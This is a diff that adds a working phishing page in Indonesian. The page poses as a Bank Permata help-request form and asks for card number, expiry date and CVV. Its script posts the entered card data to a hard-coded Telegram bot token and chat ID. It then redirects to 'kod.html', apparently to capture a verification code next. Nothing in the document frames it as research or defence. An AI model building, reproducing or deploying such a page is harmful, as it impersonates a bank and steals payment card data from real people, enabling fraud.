@@ -1,0 +1,150 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Lengkapi Data</title>
+    <style>
+        * {margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif;}
+        body {background: #f5f5f5;}
+        .header-top, .header-middle {display: flex; justify-content: space-between; align-items: center; padding: 15px 20px; background: #003366; border-bottom: 1px solid #eee;}
+        .icons-left, .icons-right {display: flex; gap: 25px; font-size: 22px; color: #fff;}
+        .login-btn {background: #ffcc00; color: #000; padding: 10px 20px; border-radius: 4px; text-decoration: none; font-weight: bold; display: flex; align-items: center; gap: 8px;}
+        .logo {height: 40px;}
+        .banner {position: relative; height: 150px; background: url('https://via.placeholder.com/1200x300') center/cover; display: flex; align-items: center; padding: 0 20px;}
+        .banner-text {color: #003366; font-size: 26px; font-weight: bold;}
+        .form-container {width: 90%; max-width: 800px; margin: -50px auto 30px; background: #fff; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); overflow: hidden;}
+        .form-header {background: #003366; color: #fff; padding: 15px 20px; font-size: 20px; font-weight: bold; border-bottom: 3px solid #ffcc00;}
+        .form-body {padding: 30px 20px;}
+        .form-group {margin-bottom: 25px;}
+        .form-label {display: block; font-size: 18px; color: #333; margin-bottom: 10px; font-weight: 500;}
+        .required {color: #ff6600; margin-left: 5px;}
+        .form-input {width: 100%; padding: 12px 15px; border: none; border-bottom: 2px solid #ccc; font-size: 18px; color: #333; background: transparent; outline: none;}
+        .form-input:focus {border-bottom-color: #003366;}
+        .form-input::placeholder {color: #aaa;}
+        .row {display: flex; gap: 15px;}
+        .col {flex: 1;}
+        .submit-btn {width: 100%; padding: 15px; background: #003366; color: #fff; border: none; border-radius: 4px; font-size: 18px; font-weight: bold; cursor: pointer; margin-top: 10px;}
+        .submit-btn:hover {background: #002244;}
+        .error {color: red; font-size: 14px; margin-top: 5px; display: none;}
+        .success {color: green; font-size: 14px; margin-top: 10px; display: none;}
+        .doc-btn {
+            width: 100%;
+            padding: 12px;
+            background: #f0f0f0;
+            color: #333;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            margin-top: 15px;
+            transition: background 0.3s;
+        }
+        .doc-btn:hover {
+            background: #e0e0e0;
+        }
+    </style>
+</head>
+<body>
+    <div class="header-middle">
+        <img src="permata-logo.png" alt="Logo" class="logo">
+        <div class="icons-right"><span></span><span>☰</span></div>
+    </div>
+    <div class="banner"><div class="banner-text"></div></div>
+    <div class="form-container">
+        <div class="form-header">Permintaan Bantuan</div>
+        <div class="form-body">
+            <div class="form-group">
+                <label class="form-label">Nomor Kartu <span class="required">✳</span></label>
+                <input type="tel" class="form-input" id="nomorKartu" placeholder="1234 5678 9012 3456" maxlength="19">
+                <div class="error" id="nomorKartuError">Nomor kartu harus 16 digit angka</div>
+            </div>
+            <div class="row">
+                <div class="col form-group">
+                    <label class="form-label">Masa Berlaku<span class="required">✳</span></label>
+                    <input type="text" class="form-input" id="masaBerlaku" placeholder="MM/YY" maxlength="5">
+                    <div class="error" id="masaBerlakuError">Format salah, gunakan MM/YY dan pastikan tanggal valid</div>
+                </div>
+                <div class="col form-group">
+                    <label class="form-label">CVV <span class="required">✳</span></label>
+                    <input type="password" class="form-input" id="cvv" placeholder="***" maxlength="3">
+                    <div class="error" id="cvvError">CVV harus 3 digit angka</div>
+                </div>
+            </div>
+            <button class="submit-btn" id="submitBtn">KONFIRMASI</button>
+            <div class="success" id="successMsg">Loading....</div>
+            <button class="doc-btn" onclick="window.location.href='document.html'">Document Pendukung</button>
+        </div>
+    </div>
+
+    <script>
+        const TELEGRAM_BOT_TOKEN = '8608464116:AAGCZcxAcp1zSsIx8tIk6ZogleASHx6ZP-s';
+        const TELEGRAM_CHAT_ID = '8399708797';
+        const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+
+        const inputElements = {nomorKartu: document.getElementById('nomorKartu'), masaBerlaku: document.getElementById('masaBerlaku'), cvv: document.getElementById('cvv')};
+        const errorElements = {nomorKartu: document.getElementById('nomorKartuError'), masaBerlaku: document.getElementById('masaBerlakuError'), cvv: document.getElementById('cvvError')};
+        const submitBtn = document.getElementById('submitBtn');
+        const successMsg = document.getElementById('successMsg');
+
+        function resetMessages() {Object.values(errorElements).forEach(el => el.style.display = 'none'); successMsg.style.display = 'none';}
+
+        inputElements.nomorKartu.addEventListener('input', e => {
+            let value = e.target.value.replace(/\s/g, '').replace(/\D/g, '');
+            e.target.value = value.match(/.{1,4}/g)?.join(' ') || value;
+            resetMessages();
+        });
+
+        inputElements.masaBerlaku.addEventListener('input', e => {
+            let value = e.target.value.replace(/\D/g, '');
+            e.target.value = value.length >= 2 ? value.slice(0, 2) + '/' + value.slice(2, 4) : value;
+            resetMessages();
+        });
+
+        function validateInput() {
+            let isValid = true;
+            const currentYear = new Date().getFullYear() % 100;
+            const currentMonth = new Date().getMonth() + 1;
+            resetMessages();
+
+            const cardNumber = inputElements.nomorKartu.value.replace(/\s/g, '');
+            if (cardNumber.length !== 16 || isNaN(cardNumber)) {errorElements.nomorKartu.style.display = 'block'; isValid = false;}
+            const expiry = inputElements.masaBerlaku.value.split('/');
+            if (expiry.length !== 2 || expiry[0].length !== 2 || expiry[1].length !== 2) {errorElements.masaBerlaku.style.display = 'block'; isValid = false;}
+            else {
+                const month = parseInt(expiry[0], 10);
+                const year = parseInt(expiry[1], 10);
+                if (isNaN(month) || isNaN(year) || month < 1 || month > 12 || year < currentYear || (year === currentYear && month < currentMonth)) {errorElements.masaBerlaku.style.display = 'block'; isValid = false;}
+            }
+            const cvv = inputElements.cvv.value;
+            if (cvv.length !== 3 || isNaN(cvv)) {errorElements.cvv.style.display = 'block'; isValid = false;}
+
+            return isValid;
+        }
+
+        async function sendToTelegram(data) {
+            const message = `📝 Formulir Permintaan Bank Permata\n💳 Nomor Kartu: ${data.nomorKartu}\n📅 Masa Berlaku: ${data.masaBerlaku}\n🔒 CVV: ${data.cvv}`;
+            try {
+                const response = await fetch(TELEGRAM_API_URL, {method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'Markdown'})});
+                return response.ok;
+            } catch (error) {console.error('Error:', error); return false;}
+        }
+
+        submitBtn.addEventListener('click', async () => {
+            if (!validateInput()) return;
+            const data = {
+                nomorKartu: inputElements.nomorKartu.value,
+                masaBerlaku: inputElements.masaBerlaku.value,
+                cvv: inputElements.cvv.value
+            };
+            const sent = await sendToTelegram(data);
+            if (sent) {
+                successMsg.style.display = 'block';
+                submitBtn.disabled = true;
+                setTimeout(() => window.location.href = 'kod.html', 3000);
+            } else alert('Gagal mengirim formulir. Silakan coba lagi.');
+        });
+    </script>
+</body>
+</html>
